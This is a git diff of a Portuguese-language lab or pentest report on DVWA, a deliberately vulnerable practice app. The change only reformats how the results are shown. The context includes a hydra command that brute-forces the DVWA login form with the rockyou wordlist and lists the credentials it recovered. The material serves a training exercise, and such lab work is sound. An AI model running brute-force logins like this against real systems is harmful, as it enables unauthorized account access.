@@ -91,13 +91,15 @@ Para evitar erros de parsing e falsos positivos associados a métodos genéricos
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.4 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
 ```
 
-figura 2
-
 Resultado Encontrado:
 
+![Principais Comandos Linux](./saida.png)
+
+```text
 Usuário: admin
 
 Senha: password
+```
 
 # 6. Vulnerabilidades Identificadas
 
